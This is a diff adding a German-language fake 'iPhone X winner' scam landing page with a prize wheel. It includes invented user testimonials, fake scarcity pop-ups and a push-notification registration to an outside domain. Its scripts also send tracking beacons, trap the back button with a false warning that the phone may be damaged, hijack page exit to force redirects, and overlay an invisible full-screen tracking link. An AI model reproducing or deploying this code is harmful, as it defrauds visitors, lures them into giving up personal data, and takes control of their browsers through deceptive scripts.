@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <base href="">
+    <script src="landings.min.js" async="" onload="pshr_init()"></script>
+    <script type="text/javascript">
+        var pshr_init = (function() {
+            setTimeout(function() {
+                registerPush({
+                    domain: '//sbscribeme.com',
+                    user: '07d675516c709a13034b6de82f52b717',
+                    landId: '5WSfxbWwrP0KY3Z',
+                    swName: 'pusherSW.js',
+                    popup: !!'',
+                    deliveryDomain: '',
+                    version: '1.4.3'    });
+            }, +1 || 1);
+        });
+    </script>
+    <script>
+        (function() {
+          if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon !== 'undefined') {
+            function knock() {
+              navigator.sendBeacon('//onclklnd.com/801499/1823783/', 'Browser with BeaconAPI Support');
+            }
+          }
+          else {
+            var browser = (function() {
+              var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+              if(/trident/i.test(M[1])){
+                tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
+                return {name:'IE',version:(tem[1]||'')};
+              }
+              if(M[1]==='Chrome'){
+                tem=ua.match(/\bOPR|Edge\/(\d+)/)
+                if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+              }
+              M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+              if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+              return {
+                name: M[0],
+                version: M[1]
+              };
+            })();
+
+            if (!(
+              (browser.name === 'Chrome' && browser.version > 39) ||
+              (browser.name === 'Edge') ||
+              (browser.name === 'Firefox' && browser.version > 31) ||
+              (browser.name === 'Opera' && browser.version > 26)
+            )) {
+              function sendBeacon(url, data, _settings) {
+                var xhr = ('XMLHttpRequest' in window) ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
+                xhr.open('POST', url, false);
+                xhr.withCredentials = true;
+                xhr.setRequestHeader('Accept', '*/*');
+                if (typeof data === 'string') {
+                  xhr.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
+                  xhr.responseType = 'text/plain';
+                } else if (Object.prototype.toString.call(data) === '[object Blob]') {
+                  if (data.type) {
+                    xhr.setRequestHeader('Content-Type', data.type);
+                  }
+                }
+
+                if (typeof _settings === 'object') {
+                  if (!isNaN(_settings.timeout)) {
+                    setTimeout(function() {
+                      if (xhr.readyState !== 4) {
+                        xhr.abort();
+                      }
+                    }, _settings.timeout);
+                    ;
+                  }
+                }
+
+                xhr.send(data);
+                return true;
+              }
+
+              function knock() {
+                sendBeacon('//onclklnd.com/801499/1823783/', 'Browser without BeaconAPI Support: ' + browser.name + ' ' + browser.version);
+              }
+            }
+            else {
+              function knock() {
+                return true;
+              }
+            }
+          }
+          var knocked = false;
+            document.addEventListener('click', function(e) {
+            if (!knocked) {
+              if ((e.target.tagName === 'A' && e.target.getAttribute('href') === '[TRACKER_URL]') ||
+                  e.target.getAttribute('data-href') === '[TRACKER_URL]') {
+                knock();
+                knocked = true;
+              }
+            }
+          });
+
+        })();
+    </script>
+    <meta charset="utf-8">
+    <meta name="google" value="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style type="text/css">
+        html{
+            font-family:sans-serif;
+            -ms-text-size-adjust:100%;
+            -webkit-text-size-adjust:100%
+        }
+        body{
+            margin:0
+        }
+        article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{
+            display:block
+        }
+        audio,canvas,progress,video{
+            display:inline-block;vertical-align:baseline
+        }
+        audio:not([controls]){
+            display:none;height:0
+        }
+        [hidden],template{
+            display:none
+        }
+        a{
+            background-color:transparent
+        }
+        a:active,a:hover{
+            outline:0
+        }
+        abbr[title]{
+            border-bottom:1px dotted
+        }b,strong{
+            font-weight:700
+            }
+        dfn{
+            font-style:italic
+        }
+        h1{
+            font-size:2em;margin:.67em 0
+        }
+        mark{
+            background:#ff0;color:#000
+        }
+        small{
+            font-size:80%
+        }
+        sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="style.css" rel="stylesheet" type="text/css">
+    <style>
+        .pic1 { background: transparent url("a1.jpg") no-repeat 0 0; }
+        .pic2 { background: transparent url("a2.jpg") no-repeat 0 0; }
+        .pic3 { background: transparent url("a3.jpg") no-repeat 0 0; }
+        .pic4 { background: transparent url("a4.jpg") no-repeat 0 0; }
+        .pic5 { background: transparent url("a5.jpg") no-repeat 0 0; }
+    </style>
+    <title>iPhone X</title>
+    <style type="text/css"></style>
+</head>
+<body class="de ltr">
+    <script type="text/javascript">
+        (function(h,l,d){h.replaceState(null,d.title,"?rzi=801499&rsz=801499&rid=");})(history,location,document);
+    </script>
+    <div id="a-nav">
+        <h1>WILLKOMMEN!</h1>
+        <div class="icon-basket"></div>
+    </div>
+    <main>
+      <div class="content">
+        <div class="main-content" id="content1">
+          <div class="toptext">
+            <div class="header">Glückwunsch, Sie sind der glückliche Besucher!</div>
+            <div class="date"></div>
+          </div>
+          <h2>
+            <span class="model-phone"></span>, Sie wurden ausgewählt, um eine besondere Prämie von unseren Sponsoren zu erhalten!
+          </h2>
+            <div class="timer">
+               Holen Sie sich Ihre Prämien! Sie haben eine Chance, eine zu erhalten!
+            </div>
+          <div id="spinner">
+            <img id="spinBG" src="wheel-bg.png">
+            <img id="spin" src="wheel.png">
+            <div class="prizes">
+                          <div class="prizes__prize prizes__prize_n1">
+                                  <img src="generic-dollars.png" class="prizes__prize__img">
+                              </div>
+                          <div class="prizes__prize prizes__prize_n2">
+                                  <img src="generic-gift-card.png" class="prizes__prize__img">
+                              </div>
+                          <div class="prizes__prize prizes__prize_n3">
+                                  <img src="generic-prize.png" class="prizes__prize__img">
+                              </div>
+                          <div class="prizes__prize prizes__prize_n4">
+                                  <img src="0372743092438.png" class="prizes__prize__img">
+                              </div>
+                      </div>
+
+            <img onclick="startSpin()" id="win" src="spin-button.png">
+
+            <img id="prize" class="animated rotateIn" src="0372743092438.png">
+          </div>
+          <hr>
+          <hr>
+          <div class="sharing">
+                                                <span id="liked">
+                    Gefällt mir              </span>
+                                                    - Kommentar                                                - Teilen                                    </div>
+          <hr>
+
+          <div class="comments">
+            <p class="total-likes" id="total_likes">
+              <span>
+                12,408          </span>
+              gefällt es        </p>
+          </div>
+          <div class="comments clearfix">
+            <p class="read-all">
+              <span>
+              Kommentare ansehen          </span>
+            </p>
+            <p class="read-count">
+              50
+              von          48,807        </p>
+          </div>
+          <div id="cmntspst"></div>
+
+                            <div class="comments">
+                <div class="comment-content pic1">
+                  <p class="name">
+                    Victoria Johnson              </p>
+                  <p>
+                    iPhone X sind heute per Post angekommen! Danke!!              </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status">
+                                  <span>
+                                      Gefällt mir                  -                                  Kommentar                  -                                  Teilen                                                  </span>
+                                -
+                                  Gerade jetzt                          </div>
+              </div>
+                      <div class="comments">
+                <div class="comment-content pic2">
+                  <p class="name">
+                    Phil Graham              </p>
+                  <p>
+                    Anfangs war ich nicht sicher, ob das wahr ist oder nicht, doch ich habe heute iPhone X erhalten :D!!              </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status">
+                                  <span>
+                                      Gefällt mir                  -                                  Kommentar                  -                                  Teilen                                                  </span>
+                                -
+                                                    2                                vor Minuten                          </div>
+              </div>
+                      <div class="comments">
+                <div class="comment-content pic3">
+                  <p class="name">
+                    Mike Hines              </p>
+                  <p>
+                    Zuerst dachte ich, das wäre ein Scherz, doch iPhone X ist heute morgen per Post angekommen! lol              </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status">
+                                  <span>
+                                      Gefällt mir                  -                                  Kommentar                  -                                  Teilen                                                  </span>
+                                -
+                                                    4                                vor Minuten                          </div>
+              </div>
+                      <div class="comments">
+                <div class="comment-content pic4">
+                  <p class="name">
+                    Sandra Moore              </p>
+                  <p>
+                    Suuuper! Ich habe iPhone X bekommen !! Mein Gott!              </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status">
+                                  <span>
+                                      Gefällt mir                  -                                  Kommentar                  -                                  Teilen                                                  </span>
+                                -
+                                                    5                                vor Minuten                          </div>
+              </div>
+                      <div class="comments">
+                <div class="comment-content pic5">
+                  <p class="name">
+                    Tom Rise              </p>
+                  <p>
+                    Gott sei dank habe ich es noch einmal mit dem Spielen versucht! Ich habe iPhone X erhalten!              </p>
+                </div>
+                <div class="clr"></div>
+                <div class="comment-status">
+                                  <span>
+                                      Gefällt mir                  -                                  Kommentar                  -                                  Teilen                                                  </span>
+                                -
+                                                    16                                vor Minuten                          </div>
+              </div>
+                      </div>
+      </div>
+    </main>
+
+    <div class="sweet-overlay" tabindex="-1"></div>
+    <div class="sweet-alert" data-custom-class="" data-has-cancel-button="false" data-has-confirm-button="true" data-allow-outside-click="false" data-has-done-function="true" data-animation="pop" data-timer="null">
+      <div class="FBTITLE">
+        <b>SIE SIND AUSERWÄHLT WORDEN!</b>
+        <span>✖</span>
+      </div>
+      <div class="sa-icon sa-success animate" style="display: none;">
+          <span class="sa-line sa-tip animateSuccessTip"></span>
+          <span class="sa-line sa-long animateSuccessLong"></span>
+          <div class="sa-placeholder"></div>
+          <div class="sa-fix"></div>
+      </div>
+      <div class="sa-icon sa-custom"></div>
+      <h2>SIE SIND AUSERWÄHLT WORDEN!</h2>
+      <p>Sie können möglicherweise eine besondere Belohnung gewinnen! Drücken Sie auf „OK“!</p>
+      <div class="sa-button-container">
+        <button class="cancel" tabindex="2" style="display: none; box-shadow: none;">Abbrechen</button>
+        <div class="sa-confirm-button-container">
+          <button class="confirm" tabindex="1" style="display: inline-block; background-color: rgb(140, 212, 245); box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.05) 0px 0px 0px 1px inset;">OK</button>
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript">
+      function addClass (el, className) {
+        if (el.classList) { el.classList.add(className); }
+        else { el.className += ' ' + className; }
+      }
+      function removeClass(el, className) {
+        if (el.classList) { el.classList.remove(className); }
+        else { el.className = el.className.replace(new RegExp('(^|\\b)' + className.split(' ').join('|') + '(\\b|$)', 'gi'), ' '); }
+      }
+      function alerts(text, autoclose, theme){
+        var elems = document.createElement('div');
+        elems.innerHTML = text;
+        addClass(elems, "motivating-element-notij");
+        addClass(elems, "motivating-element-hidden");
+        if(theme=="red") { addClass(elems, "motivating-element-theme_error"); }
+        if(theme=="blue") { addClass(elems, "motivating-element-theme_info"); }
+        var d = document.createElement('div');
+        addClass(d, "motivating-element-notij-msg");
+        d.innerHTML = elems.innerHTML;
+        elems.innerHTML = "";
+        elems.appendChild(d);
+        setTimeout(function(){
+          removeClass(elems, "motivating-element-hidden");
+          addClass(elems, "motivating-element-visible");
+        }, autoclose / 25);
+        setTimeout(function(){
+          removeClass(elems, "motivating-element-visible");
+          addClass(elems, "motivating-element-hidden");
+        }, autoclose);
+      }
+
+                      setTimeout(function() {
+            alerts("3 Registrierungsplätze verfügbar!", 5000, "red");
+          }, 3000);
+                                    setTimeout(function() {
+              alerts("Jane Browns hat iPhone X eingefordert!", 10000, "blue");
+            }, 10000);
+                                                        setTimeout(function() {
+                alerts("Einige Belohnungsartikel gehen aus!", 5000, "red");
+              }, 15000);
+                                                                                setTimeout(function() {
+                  alerts("Mike Johnson hat iPhone X eingefordert!", 10000, "blue");
+                }, 22000);
+                                                                                                            setTimeout(function() {
+                    alerts("Einige Belohnungsartikel gehen aus!", 10000, "red");
+                  }, 27000);
+    </script>
+    <script src="platform.js"></script>
+    <script src="script.js"></script>
+    <script>
+      var spin = new spinnerAction( {
+              alert1: "SIE SIND AUSERWÄHLT WORDEN!",
+              alert2: "Sie können möglicherweise eine besondere Belohnung gewinnen! Drücken Sie auf „OK“!",
+              alert3: "Viel Glück",
+              alert4: "Sie haben (1) Extra-Drehung!",
+              alert5: "Herzlichen Glückwunsch!",
+              alert6: "iPhone X ist für Sie reserviert! Bitte BEEILEN Sie sich! Sie haben nur 5 Minuten, es einzufordern! Verifizieren Sie Ihre Daten auf der nächsten Seite, um fortzufahren.",
+          }, '[TRACKER_URL]' );
+    </script>
+<script type="text/javascript">
+    
+  var fakepath=document.URL;
+  
+  window.history.pushState('index.php', 'gogogo', fakepath);
+  window.history.pushState('index.php', 'disone', fakepath);
+
+  window.addEventListener("popstate", function(e){if(document.URL.indexOf(fakepath) >= 0){
+    window.history.pushState('index.php', 'gogogo', fakepath);
+    window.history.pushState('index.php', 'disone', fakepath);
+    if (document.getElementById('snd')) {
+      document.getElementById('snd').play();
+    }
+    alert('Ein Update wird dringend empfohlen!\nAktualisieren Sie bitte oder Android könnte langsam und Ihr Handy beschädigt werden!');
+  }});
+
+</script>
+    <script type="text/javascript">
+         (function(w, d) {
+             function getCookie(name) {
+                 var matches = document.cookie.match(new RegExp(
+                         "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+                 ));
+                 return matches ? decodeURIComponent(matches[1]) : false;
+             }
+
+             function setCookie(name, value) {
+                 // for 30 minutes
+                 var date = new Date(new Date().getTime() + 60 * 30 * 1000);
+                 document.cookie = name + "=" + value + "; expires=" + date.toUTCString();
+             }
+
+            var ow = w.onload;
+            w.onload = function() {
+                setTimeout(function() {
+                    var hrf = '[TRACKER_URL]';
+                    if(!getCookie('hidePrepop')) {
+                        setCookie('hidePrepop', 1);
+                        var prepopEvent = new Event('prepopFired');
+                        document.dispatchEvent(prepopEvent);
+                    }
+                    if (typeof ow === "function") {
+                        ow();
+                    }
+                    }, 10);
+            }
+        })(window, document);
+    </script>
+  <script type="text/javascript">
+    (function(w, d){
+      var epp = function() {
+        if (w.onbeforeunload === null) {
+          var to;
+
+          function repp() {
+            w.onbeforeunload = null;
+          };
+
+          function epp() {
+            to = setTimeout(function() {
+              w.location.replace('[TRACKER_URL]');
+              repp();
+            }, 100);
+            return "********************";
+          }
+
+          w.onbeforeunload = epp;
+
+          // Prevent epp firing from clicking on tracking links
+
+          var ln = d.querySelectorAll("[href='[TRACKER_URL]'], [data-href='[TRACKER_URL]']");
+          for (i = 0; i < ln.length; ++i) {
+            ln[i].addEventListener("click", function() {
+                repp();
+            });
+          }
+        };
+
+      };
+        https://prnt.sc/j4op7q
+      if (d.readyState != 'loading'){
+        epp();
+      } else {
+        d.addEventListener('DOMContentLoaded', epp);
+      }
+    })(window, document);
+  </script>
+  <a rel="noreferrer noopener" href='[TRACKER_URL]' style="position: fixed; left: 0;
+    top: 0; right: 0; bottom: 0; display: block; z-index: 99999;" class="pagelink_hidden"></a>
+  <script type="text/javascript">
+
+    (function(w, d){
+      var epp = function() {
+
+        if (w.onbeforeunload === null) {
+          var to;
+
+          function repp() {
+            w.onbeforeunload = null;
+          };
+
+          function epp() {
+            to = setTimeout(function() {
+              w.location.replace('[TRACKER_URL]');
+              repp();
+            }, 100);
+            return "********************";
+          }
+
+          w.onbeforeunload = epp;
+
+          // Prevent epp firing from clicking on tracking links
+
+          var ln = d.querySelectorAll("[href='[TRACKER_URL]'], [data-href='[TRACKER_URL]]'");
+          for (i = 0; i < ln.length; ++i) {
+            ln[i].addEventListener("click", function() {
+                repp();
+            });
+          }
+        };
+
+      };
+
+      if (d.readyState != 'loading'){
+        epp();
+      } else {
+        d.addEventListener('DOMContentLoaded', epp);
+      }
+
+    })(window, document);
+
+  </script>
+  <div style="display:none;">
+      <a href="https://go.ad1data.com/afu.php?id=1128934&amp;var=451656625617">Go to site</a>
+  </div>
+
+</body>
+</html>
